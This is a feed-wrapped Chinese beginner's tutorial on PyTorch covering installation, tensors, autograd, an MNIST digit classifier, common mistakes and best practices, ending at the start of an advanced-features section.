<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[PyTorch 入门指南：深度学习的瑞士军刀]]></title>    <link>https://juejin.cn/post/7602916406981673001</link>    <guid>https://juejin.cn/post/7602916406981673001</guid>    <pubDate>2026-02-05T06:48:28.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602916406981673001" data-draft-id="7602914378388996106" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="PyTorch 入门指南：深度学习的瑞士军刀"/> <meta itemprop="keywords" content="Python,PyTorch"/> <meta itemprop="datePublished" content="2026-02-05T06:48:28.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="小小张说故事"/> <meta itemprop="url" content="https://juejin.cn/user/741501567509111"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            PyTorch 入门指南：深度学习的瑞士军刀
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/741501567509111/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    小小张说故事
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-05T06:48:28.000Z" title="Thu Feb 05 2026 06:48:28 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-05
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读11分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1. 库的概览与核心价值</h2>
<p>想象一下，你想建造一个能够识别图片、翻译语言或者对话的智能系统。如果你从零开始编写所有的数学运算、反向传播算法和GPU加速代码，这就像想要烤制蛋糕却需要先发明烤箱——既耗时又容易出错。PyTorch 正是为此而生的工具，它让深度学习变得触手可及。</p>
<p>PyTorch 是一个开源的深度学习框架，由 Facebook（现 Meta）AI Research 团队开发。在 Python 生态系统中，PyTorch 以其动态计算图、直观的 API 设计和强大的 GPU 加速能力著称。与静态框架不同，PyTorch 允许你像编写普通 Python 代码一样构建神经网络——可以随时调试、修改和实验，这使得它成为研究人员和工程师的首选工具。</p>
<p>PyTorch 的核心价值体现在三个方面：</p>
<ul>
<li><strong>灵活性</strong>：动态计算图让你能够轻松处理变长输入、条件分支和复杂的控制流</li>
<li><strong>直观性</strong>：与 NumPy 相似的 API 设计，学习曲线平缓</li>
<li><strong>生产级性能</strong>：通过 TorchScript 等技术，可以无缝将模型部署到生产环境</li>
</ul>
<h2 data-id="heading-1">2. 环境搭建与 "Hello, World"</h2>
<h3 data-id="heading-2">安装说明</h3>
<p>PyTorch 支持多种安装方式，推荐根据你的硬件配置选择合适的版本：</p>
<p><strong>方法一：使用 pip 安装（最简单）</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># CPU 版本（适用于无 NVIDIA 显卡的情况）</span>
pip3 install torch torchvision torchaudio

<span class="hljs-comment"># GPU 版本（需要 NVIDIA 显卡，CUDA 12.6）</span>
pip3 install torch torchvision torchaudio --index-url https://download.pytorch.org/whl/cu126
</code></pre>
<p><strong>方法二：使用 conda 安装（推荐）</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 创建虚拟环境</span>
conda create -n pytorch_env python=3.10
conda activate pytorch_env

<span class="hljs-comment"># CPU 版本</span>
conda install pytorch torchvision torchaudio cpuonly -c pytorch

<span class="hljs-comment"># GPU 版本（CUDA 12.6）</span>
conda install pytorch torchvision torchaudio pytorch-cuda=12.6 -c pytorch -c nvidia
</code></pre>
<p><strong>安装注意事项：</strong></p>
<ul>
<li>PyTorch 需要 Python 3.10 或更高版本</li>
<li>GPU 版本需要安装对应的 NVIDIA 驱动和 CUDA Toolkit</li>
<li>macOS 用户（Apple Silicon）可以使用 MPS 加速：<code>conda install pytorch -c pytorch -c apple</code></li>
</ul>
<h3 data-id="heading-3">"Hello, World" 示例</h3>
<p>让我们通过一个最简单的例子来感受 PyTorch 的魅力：</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> torch

<span class="hljs-comment"># 创建一个随机张量</span>
x = torch.rand(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"随机张量 x:"</span>)
<span class="hljs-built_in">print</span>(x)

<span class="hljs-comment"># 基本运算</span>
y = torch.ones(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>)
z = x + y
<span class="hljs-built_in">print</span>(<span class="hljs-string">"\nx + y 的结果:"</span>)
<span class="hljs-built_in">print</span>(z)

<span class="hljs-comment"># 检查 GPU 是否可用</span>
<span class="hljs-keyword">if</span> torch.cuda.is_available():
    device = torch.device(<span class="hljs-string">"cuda"</span>)
    x_gpu = x.to(device)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n张量已移动到设备: <span class="hljs-subst">{x_gpu.device}</span>"</span>)
<span class="hljs-keyword">else</span>:
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"\n未检测到 GPU，使用 CPU 版本"</span>)
</code></pre>
<p><strong>代码逐行解释：</strong></p>
<ul>
<li><code>import torch</code>：导入 PyTorch 主模块，所有的张量操作都在这个模块下</li>
<li><code>torch.rand(2, 3)</code>：创建一个形状为 2×3 的随机张量，元素值在 [0, 1) 区间均匀分布</li>
<li><code>torch.ones(2, 3)</code>：创建一个全为 1 的张量</li>
<li><code>x + y</code>：张量间的逐元素相加，PyTorch 重载了加法运算符</li>
<li><code>torch.cuda.is_available()</code>：检查系统是否支持 CUDA（NVIDIA GPU 加速）</li>
<li><code>x.to(device)</code>：将张量移动到指定设备（GPU 或 CPU）</li>
</ul>
<p><strong>预期输出示例：</strong></p>
<pre><code class="hljs language-lua" lang="lua">随机张量 x:
tensor(<span class="hljs-string">[[0.1234, 0.5678, 0.9012],
        [0.3456, 0.7890, 0.2345]]</span>)

x + y 的结果:
tensor(<span class="hljs-string">[[1.1234, 1.5678, 1.9012],
        [1.3456, 1.7890, 1.2345]]</span>)

未检测到 GPU，使用 CPU 版本
</code></pre>
<h2 data-id="heading-4">3. 核心概念解析</h2>
<p>PyTorch 的核心建立在三个基本概念之上：Tensor（张量）、Autograd（自动求导）和 Neural Network（神经网络）。理解这些概念是掌握 PyTorch 的关键。</p>
<h3 data-id="heading-5">3.1 Tensor：数据的基本单元</h3>
<p>Tensor 是 PyTorch 中最基本的数据结构，可以理解为多维数组。它与 NumPy 的 ndarray 非常相似，但有两个关键区别：支持 GPU 加速和自动求导。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 从不同方式创建张量</span>
<span class="hljs-keyword">import</span> torch

<span class="hljs-comment"># 从 Python 列表创建</span>
data = [[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>], [<span class="hljs-number">3</span>, <span class="hljs-number">4</span>]]
tensor_from_list = torch.tensor(data)

<span class="hljs-comment"># 创建特定形状的随机张量</span>
random_tensor = torch.rand(<span class="hljs-number">3</span>, <span class="hljs-number">4</span>)  <span class="hljs-comment"># 3×4 的随机张量</span>

<span class="hljs-comment"># 创建全零张量</span>
zeros_tensor = torch.zeros(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>)

<span class="hljs-comment"># 查看张量属性</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"形状: <span class="hljs-subst">{random_tensor.shape}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"数据类型: <span class="hljs-subst">{random_tensor.dtype}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"存储设备: <span class="hljs-subst">{random_tensor.device}</span>"</span>)
</code></pre>
<p><strong>张量的关键属性：</strong></p>
<ul>
<li><strong>shape（形状）</strong>：描述张量每个维度的长度，如 (2, 3) 表示 2 行 3 列</li>
<li><strong>dtype（数据类型）</strong>：如 <code>torch.float32</code>、<code>torch.int64</code> 等</li>
<li><strong>device（设备）</strong>：张量存储在 CPU 还是 GPU 上</li>
</ul>
<h3 data-id="heading-6">3.2 Autograd：自动求导引擎</h3>
<p>Autograd 是 PyTorch 的自动求导引擎，它能够自动计算神经网络中参数的梯度。这是深度学习的核心——通过反向传播算法更新模型参数。</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 演示自动求导</span>
x = torch.tensor(<span class="hljs-number">2.0</span>, requires_grad=<span class="hljs-literal">True</span>)
y = x ** <span class="hljs-number">3</span>

<span class="hljs-comment"># 计算 y 对 x 的梯度</span>
y.backward()

<span class="hljs-built_in">print</span>(<span class="hljs-string">f"x = <span class="hljs-subst">{x}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"y = x³ = <span class="hljs-subst">{y}</span>"</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">f"dy/dx = <span class="hljs-subst">{x.grad}</span>"</span>)  <span class="hljs-comment"># dy/dx = 3x² = 3 * 4 = 12</span>
</code></pre>
<p><strong>Autograd 的工作原理：</strong></p>
<ol>
<li>当你创建张量并设置 <code>requires_grad=True</code> 时，PyTorch 开始跟踪该张量的所有操作</li>
<li>这些操作被记录在计算图中</li>
<li>调用 <code>.backward()</code> 时，PyTorch 自动计算梯度并存储在 <code>.grad</code> 属性中</li>
<li>梯度用于更新神经网络中的权重参数</li>
</ol>
<h3 data-id="heading-7">3.3 核心概念关系图</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TD
    A[Tensor 张量] --&gt; B[数据存储与运算]
    A --&gt; C[GPU 加速]
    A --&gt; D[requires_grad=True]
    
    D --&gt; E[Autograd 自动求导]
    E --&gt; F[计算图构建]
    E --&gt; G[反向传播]
    E --&gt; H[梯度计算]
    
    H --&gt; I[神经网络训练]
    I --&gt; J[torch.nn 模块]
    I --&gt; K[torch.optim 优化器]
    
    J --&gt; L[模型定义]
    K --&gt; M[参数更新]
    
    C --&gt; N[CUDA/MPS 支持]
    B --&gt; O[与 NumPy 互操作]
    
    style A fill:#e1f5fe
    style E fill:#fff9c4
    style I fill:#f3e5f5
</code></pre>
<p><strong>概念间的交互：</strong></p>
<ul>
<li>Tensor 是数据的基础载体，既可以在 CPU 上运行，也可以通过 CUDA 在 GPU 上加速</li>
<li>当 Tensor 设置 <code>requires_grad=True</code> 时，Autograd 自动开始跟踪操作</li>
<li><code>torch.nn</code> 模块基于 Tensor 和 Autograd 构建神经网络层</li>
<li><code>torch.optim</code> 优化器使用 Autograd 计算的梯度来更新网络参数</li>
</ul>
<h2 data-id="heading-8">4. 实战演练：构建简单的图像分类器</h2>
<p>让我们通过一个完整的例子来体验 PyTorch 的强大功能。我们将构建一个简单的神经网络来识别手写数字（经典的 MNIST 数据集）。</p>
<h3 data-id="heading-9">需求分析</h3>
<p>我们的目标是创建一个能够识别 0-9 手写数字的神经网络模型。这个问题是深度学习的"Hello World"，但涵盖了所有核心概念：数据加载、模型定义、训练和评估。</p>
<h3 data-id="heading-10">方案设计</h3>
<p>我们将使用以下 PyTorch 组件：</p>
<ul>
<li><strong>torchvision.datasets</strong>：下载和加载 MNIST 数据集</li>
<li><strong>torch.utils.data.DataLoader</strong>：批量加载数据</li>
<li><strong>torch.nn</strong>：定义神经网络结构</li>
<li><strong>torch.optim</strong>：使用 Adam 优化器更新参数</li>
</ul>
<h3 data-id="heading-11">代码实现</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> torch
<span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn
<span class="hljs-keyword">import</span> torch.optim <span class="hljs-keyword">as</span> optim
<span class="hljs-keyword">from</span> torchvision <span class="hljs-keyword">import</span> datasets, transforms
<span class="hljs-keyword">from</span> torch.utils.data <span class="hljs-keyword">import</span> DataLoader

<span class="hljs-comment"># 1. 数据准备</span>
<span class="hljs-comment"># 定义数据预处理：转换为张量并归一化到 [0, 1]</span>
transform = transforms.Compose([
    transforms.ToTensor(),
    transforms.Normalize((<span class="hljs-number">0.5</span>,), (<span class="hljs-number">0.5</span>,))
])

<span class="hljs-comment"># 下载并加载训练集和测试集</span>
train_dataset = datasets.MNIST(<span class="hljs-string">'./data'</span>, train=<span class="hljs-literal">True</span>, download=<span class="hljs-literal">True</span>, transform=transform)
test_dataset = datasets.MNIST(<span class="hljs-string">'./data'</span>, train=<span class="hljs-literal">False</span>, download=<span class="hljs-literal">True</span>, transform=transform)

<span class="hljs-comment"># 创建数据加载器，批量大小为 64</span>
train_loader = DataLoader(train_dataset, batch_size=<span class="hljs-number">64</span>, shuffle=<span class="hljs-literal">True</span>)
test_loader = DataLoader(test_dataset, batch_size=<span class="hljs-number">64</span>, shuffle=<span class="hljs-literal">False</span>)

<span class="hljs-comment"># 2. 定义神经网络</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">SimpleNet</span>(nn.Module):
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):
        <span class="hljs-built_in">super</span>(SimpleNet, self).__init__()
        <span class="hljs-comment"># 输入层：784 个神经元（28×28 图像展平）</span>
        <span class="hljs-comment"># 隐藏层：128 个神经元</span>
        self.fc1 = nn.Linear(<span class="hljs-number">784</span>, <span class="hljs-number">128</span>)
        self.relu = nn.ReLU()
        <span class="hljs-comment"># 输出层：10 个神经元（对应 0-9 十个数字）</span>
        self.fc2 = nn.Linear(<span class="hljs-number">128</span>, <span class="hljs-number">10</span>)
    
    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x</span>):
        <span class="hljs-comment"># 展平图像张量：(batch_size, 1, 28, 28) -&gt; (batch_size, 784)</span>
        x = x.view(x.size(<span class="hljs-number">0</span>), -<span class="hljs-number">1</span>)
        <span class="hljs-comment"># 前向传播</span>
        x = self.fc1(x)
        x = self.relu(x)
        x = self.fc2(x)
        <span class="hljs-keyword">return</span> x

<span class="hljs-comment"># 初始化模型</span>
model = SimpleNet()

<span class="hljs-comment"># 3. 定义损失函数和优化器</span>
criterion = nn.CrossEntropyLoss()
optimizer = optim.Adam(model.parameters(), lr=<span class="hljs-number">0.001</span>)

<span class="hljs-comment"># 4. 训练模型</span>
num_epochs = <span class="hljs-number">5</span>

<span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_epochs):
    model.train()  <span class="hljs-comment"># 设置为训练模式</span>
    running_loss = <span class="hljs-number">0.0</span>
    
    <span class="hljs-keyword">for</span> images, labels <span class="hljs-keyword">in</span> train_loader:
        <span class="hljs-comment"># 清零梯度</span>
        optimizer.zero_grad()
        
        <span class="hljs-comment"># 前向传播</span>
        outputs = model(images)
        loss = criterion(outputs, labels)
        
        <span class="hljs-comment"># 反向传播和优化</span>
        loss.backward()
        optimizer.step()
        
        running_loss += loss.item()
    
    <span class="hljs-comment"># 打印每个 epoch 的平均损失</span>
    avg_loss = running_loss / <span class="hljs-built_in">len</span>(train_loader)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f'Epoch [<span class="hljs-subst">{epoch+<span class="hljs-number">1</span>}</span>/<span class="hljs-subst">{num_epochs}</span>], Loss: <span class="hljs-subst">{avg_loss:<span class="hljs-number">.4</span>f}</span>'</span>)

<span class="hljs-comment"># 5. 在测试集上评估模型</span>
model.<span class="hljs-built_in">eval</span>()  <span class="hljs-comment"># 设置为评估模式</span>
correct = <span class="hljs-number">0</span>
total = <span class="hljs-number">0</span>

<span class="hljs-keyword">with</span> torch.no_grad():  <span class="hljs-comment"># 不计算梯度，节省内存</span>
    <span class="hljs-keyword">for</span> images, labels <span class="hljs-keyword">in</span> test_loader:
        outputs = model(images)
        <span class="hljs-comment"># 获取预测结果（最大值的索引）</span>
        _, predicted = torch.<span class="hljs-built_in">max</span>(outputs.data, <span class="hljs-number">1</span>)
        total += labels.size(<span class="hljs-number">0</span>)
        correct += (predicted == labels).<span class="hljs-built_in">sum</span>().item()

accuracy = <span class="hljs-number">100</span> * correct / total
<span class="hljs-built_in">print</span>(<span class="hljs-string">f'测试集准确率: <span class="hljs-subst">{accuracy:<span class="hljs-number">.2</span>f}</span>%'</span>)

<span class="hljs-comment"># 6. 保存模型</span>
torch.save(model.state_dict(), <span class="hljs-string">'simple_net.pth'</span>)
<span class="hljs-built_in">print</span>(<span class="hljs-string">"模型已保存为 simple_net.pth"</span>)
</code></pre>
<h3 data-id="heading-12">运行说明</h3>
<p><strong>运行环境要求：</strong></p>
<ul>
<li>Python 3.10+</li>
<li>PyTorch 2.0+</li>
<li>torchvision（图像处理工具包）</li>
<li>足够的磁盘空间（MNIST 数据集约 50MB）</li>
</ul>
<p><strong>运行步骤：</strong></p>
<ol>
<li>确保已安装所有依赖：<code>pip install torch torchvision</code></li>
<li>将上述代码保存为 <code>mnist_classifier.py</code></li>
<li>运行程序：<code>python mnist_classifier.py</code></li>
<li>程序会自动下载 MNIST 数据集并开始训练</li>
</ol>
<p><strong>预期结果：</strong></p>
<pre><code class="hljs language-ini" lang="ini">Epoch <span class="hljs-section">[1/5]</span>, Loss: 0.3562
Epoch <span class="hljs-section">[2/5]</span>, Loss: 0.1824
Epoch <span class="hljs-section">[3/5]</span>, Loss: 0.1347
Epoch <span class="hljs-section">[4/5]</span>, Loss: 0.1078
Epoch <span class="hljs-section">[5/5]</span>, Loss: 0.0912
测试集准确率: 96.85%
模型已保存为 simple_net.pth
</code></pre>
<p><strong>结果解读：</strong></p>
<ul>
<li>损失值（Loss）随着训练逐渐下降，说明模型在学习</li>
<li>测试集准确率达到 96% 以上，表明模型具有良好的泛化能力</li>
<li>模型参数被保存，可以用于后续的预测或进一步训练</li>
</ul>
<h2 data-id="heading-13">5. 最佳实践与常见陷阱</h2>
<p>在使用 PyTorch 时，有一些最佳实践和常见错误需要特别注意。遵循这些原则可以避免很多坑，提高开发效率。</p>
<h3 data-id="heading-14">常见错误及解决方案</h3>
<p><strong>错误 1：设备不匹配</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ❌ 错误做法：GPU 张量和 CPU 张量直接运算</span>
x = torch.tensor([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>])  <span class="hljs-comment"># CPU 张量</span>
y = torch.tensor([<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>]).cuda()  <span class="hljs-comment"># GPU 张量</span>
z = x + y  <span class="hljs-comment"># 报错！设备不匹配</span>

<span class="hljs-comment"># ✅ 正确做法：确保所有张量在同一设备上</span>
device = torch.device(<span class="hljs-string">"cuda"</span> <span class="hljs-keyword">if</span> torch.cuda.is_available() <span class="hljs-keyword">else</span> <span class="hljs-string">"cpu"</span>)
x = torch.tensor([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]).to(device)
y = torch.tensor([<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>]).to(device)
z = x + y  <span class="hljs-comment"># 正常运算</span>
</code></pre>
<p><strong>错误 2：梯度累积</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ❌ 错误做法：忘记清零梯度导致梯度累积</span>
optimizer = optim.Adam(model.parameters(), lr=<span class="hljs-number">0.001</span>)

<span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_epochs):
    <span class="hljs-keyword">for</span> batch_x, batch_y <span class="hljs-keyword">in</span> dataloader:
        outputs = model(batch_x)
        loss = criterion(outputs, batch_y)
        loss.backward()  <span class="hljs-comment"># 梯度累积！</span>
        optimizer.step()
        <span class="hljs-comment"># 缺少 optimizer.zero_grad()</span>
</code></pre>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ✅ 正确做法：每次反向传播前清零梯度</span>
<span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_epochs):
    <span class="hljs-keyword">for</span> batch_x, batch_y <span class="hljs-keyword">in</span> dataloader:
        optimizer.zero_grad()  <span class="hljs-comment"># 清零梯度</span>
        outputs = model(batch_x)
        loss = criterion(outputs, batch_y)
        loss.backward()
        optimizer.step()
</code></pre>
<p><strong>错误 3：数据类型不匹配</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># ❌ 错误做法：不同数据类型张量运算</span>
a = torch.tensor([<span class="hljs-number">1</span>, <span class="hljs-number">2</span>], dtype=torch.int32)
b = torch.tensor([<span class="hljs-number">0.5</span>, <span class="hljs-number">0.5</span>], dtype=torch.float32)
c = a + b  <span class="hljs-comment"># 可能会报错或精度丢失</span>

<span class="hljs-comment"># ✅ 正确做法：统一数据类型</span>
a = a.to(torch.float32)
c = a + b  <span class="hljs-comment"># 正常运算</span>
</code></pre>
<h3 data-id="heading-15">最佳实践建议</h3>
<p><strong>1. 使用 DataLoader 高效加载数据</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 推荐配置</span>
dataloader = DataLoader(
    dataset,
    batch_size=<span class="hljs-number">32</span>,        <span class="hljs-comment"># 根据 GPU 内存调整</span>
    shuffle=<span class="hljs-literal">True</span>,         <span class="hljs-comment"># 训练集打乱</span>
    num_workers=<span class="hljs-number">4</span>,        <span class="hljs-comment"># 多进程加载数据</span>
    pin_memory=<span class="hljs-literal">True</span>       <span class="hljs-comment"># 加速 GPU 数据传输</span>
)
</code></pre>
<p><strong>2. 善用 GPU 加速</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 检查并使用 GPU</span>
device = torch.device(<span class="hljs-string">"cuda"</span> <span class="hljs-keyword">if</span> torch.cuda.is_available() <span class="hljs-keyword">else</span> <span class="hljs-string">"cpu"</span>)
model = model.to(device)

<span class="hljs-comment"># 训练时移动数据到 GPU</span>
<span class="hljs-keyword">for</span> inputs, labels <span class="hljs-keyword">in</span> dataloader:
    inputs, labels = inputs.to(device), labels.to(device)
</code></pre>
<p><strong>3. 模型保存与加载</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 保存模型</span>
torch.save({
    <span class="hljs-string">'model_state_dict'</span>: model.state_dict(),
    <span class="hljs-string">'optimizer_state_dict'</span>: optimizer.state_dict(),
    <span class="hljs-string">'epoch'</span>: epoch,
}, <span class="hljs-string">'checkpoint.pth'</span>)

<span class="hljs-comment"># 加载模型</span>
checkpoint = torch.load(<span class="hljs-string">'checkpoint.pth'</span>)
model.load_state_dict(checkpoint[<span class="hljs-string">'model_state_dict'</span>])
optimizer.load_state_dict(checkpoint[<span class="hljs-string">'optimizer_state_dict'</span>])
epoch = checkpoint[<span class="hljs-string">'epoch'</span>]
</code></pre>
<p><strong>4. 使用验证集监控训练</strong></p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># 在训练过程中监控验证集准确率</span>
best_acc = <span class="hljs-number">0.0</span>

<span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_epochs):
    <span class="hljs-comment"># 训练代码...</span>
    
    <span class="hljs-comment"># 验证</span>
    model.<span class="hljs-built_in">eval</span>()
    val_acc = evaluate(model, val_loader)
    
    <span class="hljs-comment"># 保存最佳模型</span>
    <span class="hljs-keyword">if</span> val_acc &gt; best_acc:
        best_acc = val_acc
        torch.save(model.state_dict(), <span class="hljs-string">'best_model.pth'</span>)
    
    model.train()
</code></pre>
<h3 data-id="heading-16">性能优化技巧</h3>
<ul>
<li><strong>批量大小（Batch Size）</strong>：在 GPU 内存允许的情况下，增大批量大小可以提高 GPU 利用率</li>
<li><strong>混合精度训练</strong>：使用 <code>torch.cuda.amp</code> 可以加速训练并减少内存占用</li>
<li><strong>模型并行</strong>：对于超大模型，可以将模型的不同层分布到多个 GPU 上</li>
<li><strong>梯度累积</strong>：当批量大小受限于 GPU 内存时，可以通过累积梯度模拟更大的批量</li>
</ul>
<h2 data-id="heading-17">6. 进阶指引</h2>
<p>掌握基础之后，PyTorch 还有许多高级特性和丰富的生态系统值得探索。</p>
<h3 data-id="heading-18">高级功能</h3>
